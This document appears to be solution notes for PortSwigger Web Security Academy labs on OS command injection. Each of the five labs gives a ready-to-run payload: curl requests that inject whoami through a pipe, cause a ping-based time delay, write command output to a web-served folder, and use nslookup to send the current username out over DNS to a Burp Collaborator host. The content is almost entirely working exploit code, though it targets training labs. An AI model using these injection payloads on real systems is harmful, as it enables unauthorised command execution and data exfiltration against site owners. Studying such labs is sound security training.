### Lab: OS command injection, simple case

This lab contains an OS command injection vulnerability in the product stock checker.

The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response.

To solve the lab, execute the whoami command to determine the name of the current user. 
```
curl -X POST 'https://0a8000b903c65deb8086994400ea00c8.web-security-academy.net/product/stock' \
-H "Cookie: session=xps6jUg4ZDVQyYjLsxRtl8Od15NKBPLg" \
-H "Content-Type: application/x-www-form-urlencoded" \
--data "productId=1&storeId=1|whoami"
```
### Lab: Blind OS command injection with time delays

This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response.

To solve the lab, exploit the blind OS command injection vulnerability to cause a 10 second delay. 

```
curl -X POST 'https://0aaf004b031e38f383aae249003f0080.web-security-academy.net/feedback/submit' \
-H "Cookie: session=aGcQsMDWntNeh33TGgbsEaAyZXPQ1aaY" \
-H "Content-Type: application/x-www-form-urlencoded" \
--data "csrf=yrQUWg9VFAbn3BKcnJXSA0veE8nejgvC&name=a&email=a@a||ping+-c+10+127.0.0.1||&subject=a&message=a"
```
### Lab: Blind OS command injection with output redirection

This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at:
`/var/www/images/`

The application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file.

To solve the lab, execute the whoami command and retrieve the output. 

```
curl -X POST 'https://0a0c00d903760d0f80a14ee0009600c6.web-security-academy.net/feedback/submit' \
-H "Cookie: session=JZjDvRrL8L3w2zZ9jUE9AxlDheN0FGLD" \
-H "Content-Type: application/x-www-form-urlencoded" \
--data "csrf=l3wvGkjn9z0e6hbLSU9QdyzSS0RokutP&name=a&email=email=||whoami>/var/www/images/output.txt||&subject=a&message=a";
curl 'https://0a0c00d903760d0f80a14ee0009600c6.web-security-academy.net/image?filename=output.txt'
```
### Lab: Blind OS command injection with out-of-band interaction

This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp Collaborator. 



Modify the email parameter, changing it to:
`email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||`
### Lab: Blind OS command injection with out-of-band data exfiltration

This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, execute the whoami command and exfiltrate the output via a DNS query to Burp Collaborator. You will need to enter the name of the current user to complete the lab. 


Modify the email parameter, changing it to something like the following, but insert your Burp Collaborator subdomain where indicated:
``email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||``
